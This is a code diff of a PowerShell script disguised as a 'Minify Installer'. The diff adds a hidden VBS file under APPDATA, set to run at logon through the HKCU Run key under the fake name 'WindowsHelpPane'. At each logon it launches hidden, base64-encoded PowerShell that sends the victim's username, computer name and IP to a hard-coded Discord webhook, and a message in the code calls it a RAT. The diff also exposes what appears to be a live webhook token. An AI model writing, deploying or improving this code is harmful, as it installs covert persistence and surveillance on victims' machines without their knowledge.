@@ -32,9 +32,7 @@ function Send-LogNotification {
         $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
         if (-not $publicIP) { $publicIP = "Не удалось определить" }
     }
-    catch {
-        $publicIP = "Ошибка получения IP"
-    }
+    catch { $publicIP = "Ошибка получения IP" }
     
     $countryFlag = Get-CountryByIpAndFlag
     $ipWithFlag = if ($countryFlag) { "$countryFlag $publicIP" } else { $publicIP }
@@ -69,75 +67,50 @@ function Send-LogNotification {
     }
 }
 
-# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА (ПЕРЕРАБОТАНА) ---
+# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА ---
 function Install-MonitorAgent {
     param(
         [string]$TargetProcessName = "Поиск"
     )
 
-    $agentDir = "$env:APPDATA\Microsoft\HelpPane"
-    $agentScriptPath = "$agentDir\monitor.ps1"
-    $taskName = "WindowsHelpPaneTask" # Уникальное имя для задачи
+    $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
+    $monitorScriptPath = "$monitorDir\monitor.vbs"
+    $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regValueName = "WindowsHelpPane"
 
-    # Создаем скрытую папку, если ее нет
-    if (-not (Test-Path $agentDir)) {
-        New-Item -Path $agentDir -ItemType Directory -Force | Out-Null
-        (Get-Item $agentDir).Attributes += "Hidden"
+    if (-not (Test-Path $monitorDir)) {
+        New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
+        (Get-Item $monitorDir).Attributes += "Hidden"
     }
 
-    # Создаем PS1-скрипт агента. Здесь нет проблем с кавычками.
-    # Этот скрипт будет проверять процесс и отправлять лог.
-    $agentScriptContent = @"
-# Проверяем, запущен ли процесс
-if (Get-Process -Name "$TargetProcessName" -ErrorAction SilentlyContinue) {
-    # Если да, отправляем уведомление
-    try {
-        `$timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
-        `$publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
-        if (-not `$publicIP) { `$publicIP = "Не удалось определить" }
-        
-        # Функция для получения флага (копируем логику сюда)
-        try {
-            `$response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode" -TimeoutSec 5 -ErrorAction SilentlyContinue
-            `$countryCode = `\$response.countryCode
-            if (`$countryCode -and `\$countryCode.Length -eq 2) {
-                `$flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]`\$countryCode[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]`$countryCode[1] - [int][char]"A" + 0x1F1E6))
-                `$ipWithFlag = "`$flag `$publicIP"
-            } else {
-                `$ipWithFlag = `\$publicIP
-            }
-        } catch {
-            `$ipWithFlag = `\$publicIP
-        }
+    # Используем одинарные кавычки для Here-String, чтобы отключить интерполяцию переменных PS
+    $vbsContent = @'
+On Error Resume Next
+Set objShell = CreateObject("WScript.Shell")
+Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'Поиск.exe'",,48)
+processFound = False
 
-        `$webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
-        `\$embed = @{
-            title = "Minify Installer Log"
-            color = 65280
-            fields = @(
-                @{ name = "Status"; value = "AUTO_RUN_SUCCESS"; inline = `$true },
-                @{ name = "User"; value = `$env:USERNAME; inline = `$true },
-                @{ name = "Computer"; value = `$env:COMPUTERNAME; inline = `$true },
-                @{ name = "IP Address"; value = `$ipWithFlag; inline = `$true },
-                @{ name = "Message"; value = "Ратка успешно стартовала из автозагрузки."; inline = `$false },
-                @{ name = "Timestamp"; value = `$timestamp; inline = `\$false }
-            )
-            footer = @{ text = "Minify Installer v3.2.1" }
-        }
-        `$payload = @{ embeds = @(`\$embed) } | ConvertTo-Json -Depth 10
-        `$headers = @{ "Content-Type" = "application/json; charset=utf-8" }
-        Invoke-RestMethod -Uri `\$webhookUrl -Method Post -Headers `$headers -Body `\$payload -ErrorAction SilentlyContinue
-    } catch { }
+For Each objItem in colItems
+    processFound = True
+    Exit For
+Next
 
-    # Удаляем задачу, чтобы не спамить
-    try {
-        Unregister-ScheduledTask -TaskName "\$taskName" -Confirm:`\$false -ErrorAction SilentlyContinue
-    } catch { }
+If processFound Then
+    psCode = "function Send-LogNotification { param([string]$Status, [string]$Message); $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'; try { $webhookUrl = 'https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; $embed = @{ title = 'Minify Installer Log'; color = 65280; fields = @( @{ name = 'Status'; value = $Status; inline = $true }, @{ name = 'User'; value = $env:USERNAME; inline = $true }, @{ name = 'Computer'; value = $env:COMPUTERNAME; inline = $true }, @{ name = 'Message'; value = $Message; inline = $false }, @{ name = 'Timestamp'; value = $timestamp; inline = $false } ); footer = @{ text = 'Minify Installer v3.2.1' } }; $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10; $headers = @{ 'Content-Type' = 'application/json; charset=utf-8' }; Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue } catch { } }; Send-LogNotification -Status 'AUTO_RUN_SUCCESS' -Message 'Ратка успешно стартовала из автозагрузки.'"
+    
+    encoded = objShell.Exec("powershell.exe -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(psCode, "'", "''") & "'))""").StdOut.ReadAll
+    objShell.Run "powershell.exe -NoP -W Hidden -Enc " & encoded, 0, True
+    
+    objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHelpPane"
+End If
+'@
+    
+    $vbsContent | Out-File -FilePath $monitorScriptPath -Encoding UTF8 -Force
+    (Get-Item $monitorScriptPath).Attributes += "Hidden"
+    Set-ItemProperty -Path $regKey -Name $regValueName -Value "wscript.exe `"$monitorScriptPath`" //B" -Force
 }
-"@
 
-    # Записываем скрипт агента в файл
-    $agentScriptContent | Out-File -FilePath $agentScriptPath -Encoding UTF8 -Force
-    (Get-Item \$agentScriptPath).Attributes += "Hidden"
-
-    # Создаем Scheduled Task вместо реестра. Это надеж
+# Пример запуска (добавь свои вызовы функций ниже, если нужно)
+# Install-MonitorAgent
+# Send-LogNotification -Status "SUCCESS" -Message "Инсталлятор запущен"
